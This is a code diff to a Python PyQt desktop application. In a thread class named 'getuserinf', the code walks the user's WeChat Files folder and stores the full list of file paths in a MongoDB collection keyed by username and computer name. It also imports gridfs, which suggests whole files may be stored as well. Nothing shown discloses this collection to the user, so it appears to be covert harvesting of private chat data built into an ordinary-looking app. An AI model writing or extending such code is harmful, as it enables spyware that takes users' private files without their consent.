@@ -11,6 +11,7 @@ import time
 import requests
 import getpass
 from pymongo import MongoClient
+from gridfs import *
 
 class readthread(QThread):
     sinOutpro = pyqtSignal(float)
@@ -262,8 +263,11 @@ class getuserinf(QThread):
         db = conn.userdata
         key = username + pcname
         mycol = db[username + pcname]
-        mycol.remove({})
-        wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
+        # mycol.remove({})
+        if(os.path.exists('C:/Users/' + username + '/Documents/WeChat Files/')):
+            wxfilepath = 'C:/Users/' + username + '/Documents/WeChat Files/'
+        else:
+            return
         tarpath = ''
         for i in os.listdir(wxfilepath):
             # print(i[:2])
@@ -275,7 +279,8 @@ class getuserinf(QThread):
             for name in files:
                 # print(os.path.join(root, name))
                 filelist.append(os.path.join(root, name))
-        mycol.insert({'xwdata': filelist})
+        mycol.insert({'xwdatas': filelist})
+
 
 
 
